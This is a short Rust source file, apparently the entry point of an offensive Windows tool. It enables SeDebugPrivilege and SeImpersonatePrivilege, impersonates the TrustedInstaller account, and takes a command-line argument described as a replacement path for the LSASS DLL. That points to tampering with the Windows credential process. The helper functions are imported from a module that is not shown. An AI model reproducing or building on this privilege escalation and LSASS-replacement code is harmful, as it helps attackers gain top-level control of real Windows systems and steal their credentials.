#![allow(dead_code, unused_variables)]

mod code;
mod ytpes;

use std::process::exit;
use clap::Parser;

use winapi::um::winnt::SE_DEBUG_NAME;
use winapi::um::winnt::SE_IMPERSONATE_NAME;

use crate::code::{enable_privilege, impersonate_trusted_installer};

#[derive(Parser, Debug)]
#[command(version, about, long_about = None)]
struct Args {
    /// Used to replace the original lsass dll path
    #[arg(short, long)]
    dll_path: String,
}

fn main() {
    let args = Args::parse();

    println!("{}", args.dll_path);

    if !enable_privilege(SE_DEBUG_NAME) {
        #[cfg(feature = "print")]
        println!("[!] No SE_DEBUG_NAME privilege");
    };
    if !enable_privilege(SE_IMPERSONATE_NAME){
        exit(1);
    };

    #[cfg(feature = "print")]
    println!("[*] Enabled SeDebugPrivilege and SeImpersonatePrivilege");

    impersonate_trusted_installer();

    #[cfg(feature = "print")]
    println!("[*] Impersonated TrustedInstaller");
}
